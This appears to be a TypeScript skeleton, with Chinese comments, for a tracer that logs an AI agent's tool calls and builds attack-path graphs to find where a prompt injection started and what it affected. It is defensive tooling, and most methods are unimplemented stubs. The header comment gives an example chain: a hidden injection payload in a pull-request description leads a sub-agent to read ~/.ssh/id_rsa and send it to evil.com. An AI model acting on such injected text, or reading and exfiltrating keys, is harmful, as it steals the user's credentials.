/**
 * 调用链图谱构建器
 * 负责人：C
 *
 * 职责：
 *   - 记录全量工具调用及它们之间的调用关系
 *   - 构建攻击路径 DAG（有向无环图）
 *   - 标记攻击触发源、上下文来源、影响范围
 *
 * 图谱结构：
 *   根节点 → 主Agent → [工具调用节点] → [子Agent节点] → [子工具调用节点]
 *   每个节点记录：调用时间、工具名、参数、返回值、来源归属
 *
 * 攻击路径示例：
 *   [用户输入: "review PR#42"]
 *       → [主Agent: fs.read PR描述]
 *       → [检测: PR描述含隐藏注入载荷⚠️]  ← 标记为攻击源
 *       → [子Agent: fs.read ~/.ssh/id_rsa 🔴]  ← 偏离意图
 *       → [子Agent: net.fetch evil.com 🔴]      ← 数据外发
 */

export interface ToolCallRecord {
  id: string;
  timestamp: number;
  agentId: string;                     // 执行调用的 Agent（主Agent/子Agent）
  parentAgentId?: string;              // 父 Agent ID（用于子Agent溯源）
  toolName: string;
  toolArgs: Record<string, unknown>;
  toolResult?: string;                 // 工具返回内容（截断存储）
  isSuspicious: boolean;               // 是否被标记为可疑
  suspicionReason?: string;
  sourceAttribution: {                 // 上下文来源归属
    type: 'user_input' | 'external_resource' | 'memory' | 'mcp_response' | 'tool_description';
    sourceId: string;                  // 消息ID / URL / 文件路径 / 记忆条目ID
    sourceSnippet: string;             // 攻击载荷所在原文片段
  };
}

export interface CallGraphNode {
  id: string;
  record: ToolCallRecord;
  children: CallGraphNode[];           // 子调用（如子Agent的调用）
  isAttackSource: boolean;             // 是否为攻击触发源节点
  isAnomalous: boolean;                // 是否为异常行为节点
}

export interface CallGraph {
  rootNode: CallGraphNode;
  totalNodes: number;
  suspiciousNodes: number;
  attackSources: CallGraphNode[];      // 所有攻击触发源节点
  impactedResources: {                 // 影响范围摘要
    files: string[];
    networkTargets: string[];
    gitRepos: string[];
    credentials: string[];
  };
}

export class Tracer {
  private records: ToolCallRecord[] = [];
  private auditLogPath: string;

  constructor(auditLogPath: string) {
    this.auditLogPath = auditLogPath;
  }

  /**
   * 记录一次工具调用
   */
  record(call: ToolCallRecord): void {
    // TODO(C): 将调用记录写入内存 + 持久化到审计日志
    this.records.push(call);
    // 同时写入 SQLite / JSON 日志
  }

  /**
   * 构建调用链 DAG
   * 根据 records 中的 agentId / parentAgentId 构建父子关系
   * @returns 完整调用图谱
   */
  buildGraph(): CallGraph {
    // TODO(C): 构建有向无环图

    // 步骤1：建立 agentId → 节点的索引
    // TODO(C)

    // 步骤2：根据 parentAgentId 连接父子关系
    // TODO(C)

    // 步骤3：标记攻击源节点
    //   遍历所有节点，找到 sourceAttribution.type != 'user_input' 且 isSuspicious=true 的
    // TODO(C)

    // 步骤4：标记异常行为节点
    //   根据偏离度评分/策略触发标记
    // TODO(C)

    // 步骤5：汇总影响范围
    //   收集所有异常节点操作的 files / networkTargets / gitRepos / credentials
    // TODO(C)

    throw new Error('Not implemented');
  }

  /**
   * 根据攻击源溯源完整链路
   * 从攻击源节点出发，沿 DAG 向下游追踪所有受影响的调用
   * @returns 有序的攻击链路节点列表
   */
  traceAttackPath(sourceNode: CallGraphNode): CallGraphNode[] {
    // TODO(C): BFS/DFS 溯源
    throw new Error('Not implemented');
  }

  /**
   * 持久化审计日志到 SQLite
   */
  private async persistToDatabase(record: ToolCallRecord): Promise<void> {
    // TODO(C): SQLite 写入
    throw new Error('Not implemented');
  }
}

export { Tracer as CallGraphBuilder };
